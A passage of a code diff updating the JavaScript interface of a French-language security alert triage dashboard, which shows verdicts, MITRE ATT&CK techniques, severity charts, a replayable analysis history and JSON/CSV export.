+  if (t.brut !== undefined) { $("result").innerHTML = `<p class="err">RÉPONSE NON STRUCTURÉE</p><pre>${esc(t.brut)}</pre>`; return; }
+  const ben = isBen(t), [lvl, col] = sevInfo(t.severite), ta = (String(t.tactique || "").match(/TA\d{4}/) || [""])[0];
+  let h = `<div class="verdict"><div><div class="tiny">VERDICT</div><div class="vm ${ben ? "ok" : ""}">${ben ? "BÉNIN" : "SUSPECT"}</div>
+      <div class="tiny" style="margin-top:.4rem">${esc((rec.host || "HÔTE INCONNU").toUpperCase())} · ${new Date(rec.ts).toLocaleString("fr-FR")}</div></div>
+    <div style="text-align:right"><div class="tiny">SÉVÉRITÉ</div><div class="big" style="font-size:1.9rem;color:${col}">${esc((t.severite || "—").toUpperCase())}</div>
+      <div class="sevm">${[1,2,3,4,5].map(i => `<i style="${i <= lvl ? "background:" + col : ""}"></i>`).join("")}</div></div></div>`;
+  if (!ben) h += `<div class="tech"><div><div class="tiny">TECHNIQUE MITRE ATT&amp;CK</div><div style="margin-top:.5rem">${t.technique_id ? `<a class="tid" href="${attackUrl(t.technique_id)}" target="_blank" rel="noopener">${esc(t.technique_id)} ↗</a>` : ""}</div>
+      <div class="tname">${esc(t.technique || "—")}</div></div>
+      <div style="text-align:right"><div class="tiny">TACTIQUE</div><div style="font:600 1.05rem var(--sans);margin-top:.5rem">${esc(t.tactique || "—")}</div></div></div>
+    <h3>CHAÎNE D'ATTAQUE · 15 TACTIQUES</h3><div class="chain">${TACTICS.map(([id, n]) => `<i class="${id === ta ? "on" : ""}" data-t="${id} · ${n.toUpperCase()}"></i>`).join("")}</div>
+    <div class="row m"><span>RECONNAISSANCE</span><span>IMPACT</span></div>`;
+  h += `<h3>ANALYSE</h3><div class="expl">${esc(t.explication || "")}</div>`;
   if (Array.isArray(t.recommandations) && t.recommandations.length)
-    h += `<h3>Actions recommandées</h3><ul class="recos">${t.recommandations.map(r => `<li><input type="checkbox"><span>${esc(r)}</span></li>`).join("")}</ul>`;
-  h += `<div class="meta"><span>Moteur : ${esc(rec.engine)}</span><span>Durée : ${rec.secs.toFixed(1)} s</span></div>
-    <details><summary>Réponse JSON brute</summary><pre>${esc(JSON.stringify(t, null, 2))}</pre></details>`;
+    h += `<h3>ACTIONS RECOMMANDÉES</h3>${t.recommandations.map((r, i) => `<div class="reco"><span class="n">0${i + 1}</span><span>${esc(r)}</span></div>`).join("")}`;
+  h += `<div class="foot"><span>MOTEUR <b>${esc(rec.engine)}</b></span><span>DURÉE <b>${rec.secs.toFixed(1)} S</b></span></div>
+    <div class="btns" style="margin-top:.8rem"><button class="btn" id="btn-copy">COPIER LE JSON</button></div>
+    <details><summary>RÉPONSE JSON BRUTE</summary><pre>${esc(JSON.stringify(t, null, 2))}</pre></details>`;
   $("result").innerHTML = h;
+  document.querySelectorAll(".reco").forEach(r => r.onclick = () => r.classList.toggle("done"));
+  $("btn-copy").onclick = async () => { try { await navigator.clipboard.writeText(JSON.stringify(t, null, 2)); toast("JSON COPIÉ"); } catch { toast("COPIE IMPOSSIBLE"); } };
+  $("msg").textContent = ben ? "BÉNIN · AUCUNE ACTION" : `${t.technique_id || "SUSPECT"} · ${(t.severite || "").toUpperCase()}`;
 }
-$("btn-copy").onclick = async () => { if (!current) return; try { await navigator.clipboard.writeText(JSON.stringify(current.triage, null, 2)); toast("JSON copié"); } catch { toast("Copie impossible"); } };
 
+/* ---------- historique, stats, journal ---------- */
+const chart = $("chart"), cx = chart.getContext("2d");
+function drawChart() {
+  const w = chart.clientWidth, h = chart.clientHeight, dpr = Math.min(devicePixelRatio, 2);
+  if (chart.width !== Math.round(w * dpr)) { chart.width = Math.round(w * dpr); chart.height = Math.round(h * dpr); }
+  cx.setTransform(dpr, 0, 0, dpr, 0, 0); cx.clearRect(0, 0, w, h);
+  cx.strokeStyle = "#d3e8e7"; cx.lineWidth = 1;
+  for (let k = 1; k <= 5; k++) { const y = h - 6 - (k - 1) / 4 * (h - 14); cx.beginPath(); cx.moveTo(0, y); cx.lineTo(w, y); cx.stroke(); }
+  const pts = history.slice(0, 40).reverse(); if (!pts.length) return;
+  const X = i => pts.length === 1 ? w / 2 : 6 + i / (pts.length - 1) * (w - 12), Y = l => h - 6 - (Math.max(l, 1) - 1) / 4 * (h - 14);
+  cx.strokeStyle = "#ff5a3c"; cx.lineWidth = 1.6; cx.beginPath();
+  pts.forEach((r, i) => { const y = Y(sevInfo(r.triage.severite)[0]); i ? cx.lineTo(X(i), y) : cx.moveTo(X(i), y); }); cx.stroke();
+  pts.forEach((r, i) => { const l = sevInfo(r.triage.severite)[0]; cx.fillStyle = SEVHEX[l]; cx.beginPath(); cx.arc(X(i), Y(l), 3, 0, 7); cx.fill(); });
+}
 function refresh() {
-  const n = history.length, sus = history.filter(r => !String(r.triage.verdict || "").toLowerCase().startsWith("b"));
-  $("k-total").textContent = n; $("k-sus").textContent = sus.length;
-  $("k-susp").textContent = n ? Math.round(100 * sus.length / n) + " % des alertes" : "—";
-  $("k-high").textContent = history.filter(r => sevInfo(r.triage.severite)[0] >= 4).length;
-  $("k-tech").textContent = new Set(sus.map(r => r.triage.technique_id).filter(Boolean)).size;
-  $("k-time").textContent = n ? (history.reduce((a, r) => a + r.secs, 0) / n).toFixed(0) + " s" : "—";
-  $("hist").innerHTML = n ? history.map((r, i) => { const t = r.triage, b = String(t.verdict || "").toLowerCase().startsWith("b"), [, c] = sevInfo(t.severite);
+  const n = history.length, sus = history.filter(r => !isBen(r.triage)), high = history.filter(r => sevInfo(r.triage.severite)[0] >= 4).length;
+  $("k-total").textContent = n; $("k-sus").textContent = sus.length; $("k-tech").textContent = new Set(sus.map(r => r.triage.technique_id).filter(Boolean)).size;
+  $("k-time").textContent = n ? (history.reduce((a, r) => a + r.secs, 0) / n).toFixed(0) + " S" : "—";
+  $("k-high").textContent = high + " CRITIQUES / ÉLEVÉES";
+  const recent = history.slice(0, 10), load = recent.length ? recent.reduce((a, r) => a + sevInfo(r.triage.severite)[0], 0) / (recent.length * 5) : 0;
+  $("loadv").textContent = Math.round(load * 100) + "%";
+  [...$("loadbar").children].forEach((b, i) => b.style.background = i / 50 < load ? (i > 35 ? "var(--coral)" : i > 20 ? "var(--teal)" : "var(--ink)") : "");
+  $("hist").innerHTML = n ? history.map((r, i) => { const t = r.triage, b = isBen(t), [, c] = sevInfo(t.severite);
     return `<tr class="clk" data-i="${i}"><td>${new Date(r.ts).toLocaleTimeString("fr-FR")}</td><td>${esc(r.host || "—")}</td>
-      <td><span class="pill ${b ? "ben" : "sus"}">${b ? "bénin" : "suspect"}</span></td>
-      <td>${t.technique_id ? `<span class="tag">${esc(t.technique_id)}</span> ` : ""}${esc((t.technique || "—").slice(0, 40))}</td>
-      <td>${esc((t.tactique || "—").replace(/\s*\(TA\d+\)/, ""))}</td><td><span class="sv"><i style="background:${c}"></i>${esc(t.severite || "—")}</span></td></tr>`; }).join("")
-    : `<tr><td colspan="6" class="muted" style="text-align:center; padding:24px">Aucune analyse pour le moment</td></tr>`;
-  document.querySelectorAll("#hist tr.clk").forEach(tr => tr.onclick = () => { current = history[+tr.dataset.i]; $("event").value = current.event; render(current); window.scrollTo({ top: 0, behavior: "smooth" }); });
+      <td><span class="pill ${b ? "ok" : ""}">${b ? "BÉNIN" : "SUSPECT"}</span></td><td>${t.technique_id ? `<b>${esc(t.technique_id)}</b> ` : ""}${esc((t.technique || "—").slice(0, 38))}</td>
+      <td>${esc((t.tactique || "—").replace(/\s*\(TA\d+\)/, ""))}</td><td><span class="sq" style="background:${c}"></span>${esc(t.severite || "—")}</td></tr>`; }).join("")
+    : `<tr><td colspan="6" class="empty" style="padding:2rem">AUCUNE ANALYSE POUR LE MOMENT</td></tr>`;
+  document.querySelectorAll("#hist tr.clk").forEach(tr => tr.onclick = () => select(+tr.dataset.i));
   const counts = {}; sus.forEach(r => { const m = String(r.triage.tactique || "").match(/TA\d{4}/); if (m) counts[m[0]] = (counts[m[0]] || 0) + 1; });
   const max = Math.max(1, ...Object.values(counts));
   $("tacbars").innerHTML = Object.keys(counts).length ? TACTICS.filter(([id]) => counts[id]).map(([id, nm]) =>
-    `<div class="r"><span>${esc(nm)}</span><div class="t"><i style="width:${100 * counts[id] / max}%"></i></div><span class="n">${counts[id]}</span></div>`).join("")
-    : `<div class="muted small">Les tactiques détectées apparaîtront ici.</div>`;
+    `<div class="hb"><span>${esc(nm.toUpperCase())}</span><u><i style="width:${100 * counts[id] / max}%"></i></u><s>${counts[id]}</s></div>`).join("")
+    : `<div class="empty" style="padding:2rem 0">AUCUNE TACTIQUE DÉTECTÉE</div>`;
+  const rail = $("rail"); rail.querySelectorAll("em").forEach(e => e.remove());
+  const seq = history.slice(0, 40).reverse();
+  seq.forEach((r, k) => { const e = document.createElement("em"); e.style.left = (seq.length === 1 ? 50 : k / (seq.length - 1) * 100) + "%";
+    if (isBen(r.triage)) e.classList.add("ok"); if (r === current) e.classList.add("sel"); e.title = (r.triage.technique_id || r.triage.verdict || "") + " · " + (r.host || "");
+    e.onclick = () => select(history.indexOf(r)); rail.append(e); });
+  $("tc").textContent = (current && history.includes(current) ? seq.indexOf(current) + 1 : 0) + " / " + seq.length;
+  drawChart();
 }
+function select(i) { current = history[i]; if (!current) return; $("event").value = current.event; render(current); refresh(); }
+/* rejouer le journal : parcourt les analyses une à une */
+let replay = null;
+$("play").onclick = () => {
+  if (replay) { clearInterval(replay); replay = null; $("pi").setAttribute("d", "M3 1l8 5-8 5z"); return; }
+  const seq = history.slice(0, 40).reverse(); if (!seq.length) return toast("JOURNAL VIDE");
+  let k = 0; $("pi").setAttribute("d", "M2 1h3v10H2zM7 1h3v10H7z");
+  const step = () => { if (k >= seq.length) { clearInterval(replay); replay = null; $("pi").setAttribute("d", "M3 1l8 5-8 5z"); return; } select(history.indexOf(seq[k++])); };
+  step(); replay = setInterval(step, 1800);
+};
 function download(name, content, type) { const a = document.createElement("a"); a.href = URL.createObjectURL(new Blob([content], { type })); a.download = name; a.click(); URL.revokeObjectURL(a.href); }
 $("btn-json").onclick = () => download("soc-qwen-historique.json", JSON.stringify(history, null, 2), "application/json");
-$("btn-csv").onclick = () => {
-  const q = (v) => `"${String(v ?? "").replace(/"/g, '""')}"`;
+$("btn-csv").onclick = () => { const q = v => `"${String(v ?? "").replace(/"/g, '""')}"`;
   const rows = [["horodatage","hote","verdict","technique_id","technique","tactique","severite","explication","moteur","duree_s"]]
     .concat(history.map(r => [r.ts, r.host, r.triage.verdict, r.triage.technique_id, r.triage.technique, r.triage.tactique, r.triage.severite, r.triage.explication, r.engine, r.secs.toFixed(1)]));
-  download("soc-qwen-historique.csv", "\ufeff" + rows.map(r => r.map(q).join(";")).join("\n"), "text/csv");
-};
-$("btn-reset").onclick = () => { if (!history.length) return; history = []; store.set("socqwen.history", history); refresh(); toast("Historique vidé"); };
-refresh();
+  download("soc-qwen-historique.csv", "\ufeff" + rows.map(r => r.map(q).join(";")).join("\n"), "text/csv"); };
+$("btn-reset").onclick = () => { if (!history.length) return; history = []; current = null; store.set("socqwen.history", history); refresh(); toast("HISTORIQUE VIDÉ"); };
+addEventListener("resize", drawChart);
+document.fonts.ready.then(refresh); refresh();
 </script>
 </body>
 </html>
